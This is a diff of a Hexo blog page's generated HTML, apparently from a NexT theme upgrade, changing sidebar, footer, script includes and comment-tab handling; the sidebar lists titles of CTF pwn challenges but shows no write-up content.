-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
   }
 </script>
 
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-number">1.1.</span> <span class="nav-text">level2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#guess-num"><span class="nav-number">1.2.</span> <span class="nav-text">guess_num</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#int-overflow"><span class="nav-number">1.3.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgpwn2"><span class="nav-number">1.4.</span> <span class="nav-text">cgpwn2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#when-did-you-born"><span class="nav-number">1.5.</span> <span class="nav-text">when_did_you_born</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hello-pwn"><span class="nav-number">1.6.</span> <span class="nav-text">hello_pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level0"><span class="nav-number">1.7.</span> <span class="nav-text">level0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-number">1.8.</span> <span class="nav-text">level3</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="SNCKER"
+      src="http://q1.qlogo.cn/g?b=qq&nk=948375961&s=640">
+  <p class="site-author-name" itemprop="name">SNCKER</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/blog/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/blog/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SNCKER</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
 
 
 
 
 
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/blog/lib/anime.min.js"></script>
+  <script src="/blog/lib/velocity/velocity.min.js"></script>
+  <script src="/blog/lib/velocity/velocity.ui.min.js"></script>
+<script src="/blog/js/utils.js"></script><script src="/blog/js/motion.js"></script>
+<script src="/blog/js/schemes/pisces.js"></script>
+<script src="/blog/js/next-boot.js"></script>
 
 
 
@@ -710,105 +492,6 @@
 
 
 
-  
-  
-    <script type="text/javascript" src="/blog/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/blog/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/blog/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/blog/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/blog/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/blog/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/blog/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/blog/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/blog/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/blog/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="/blog/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/blog/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/blog/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
 
 
 
@@ -816,18 +499,5 @@
 
   
 
-  
-
-  
-  
-
-  
-
-  
-
-  
-
-  <!-- 页面点击小红心 -->
-  <script type="text/javascript" src="/blog/js/love.js"></script>
 </body>
 </html>
